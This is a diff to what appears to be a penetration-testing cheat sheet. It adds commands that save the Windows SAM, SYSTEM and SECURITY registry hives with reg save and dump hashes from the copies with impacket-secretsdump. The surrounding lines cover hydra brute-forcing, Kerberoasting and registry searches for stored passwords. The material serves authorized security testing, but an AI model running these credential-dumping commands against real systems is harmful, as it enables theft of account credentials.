@@ -1314,6 +1314,9 @@ hydra l user_name_here -p /path/to/wordlist url_here http-form-post "/path/to/lo
 # dump secrets as user
 /path/to/impacket-secretsdump -dc-ip IP_here user:password@IP_here
 
+# dump hashes from SYSTEM, SAM, SECURITY registry files
+/path/to/impacket-secretsdump -sam /path/to/copy/of/sam -system /path/to/copy/of/system -security /path/to/copy/of/security
+
 # kerberoasting : gather NTLM hashes
 /path/to/impacket/examples/GetUserSPNs.py -request -dc-ip IP_here domain/user
 
@@ -2204,13 +2207,22 @@ show hosts
 
 
 
-## REG QUERY
+## REG
 ```powershell
 # enumerate registry information, search recursively for password in HKLM
 reg query HKLM /f password /t REG_SZ /s
 
 # enumerate registry information, search recursively for password in HKCU
 reg query HKCU /f password /t REG_SZ /s
+
+# create copy of SYSTEM
+reg save HKLM\SYSTEM C:\path\to\copy\location\SYSTEM.save
+
+# create copy of SAM
+reg save HKLM\SAM C:\path\to\copy\location\SAM.save
+
+# create copy of SECURITY
+reg save HKLM\SECURITY C:\path\to\copy\location\SECURITY.save
 ```
 
 
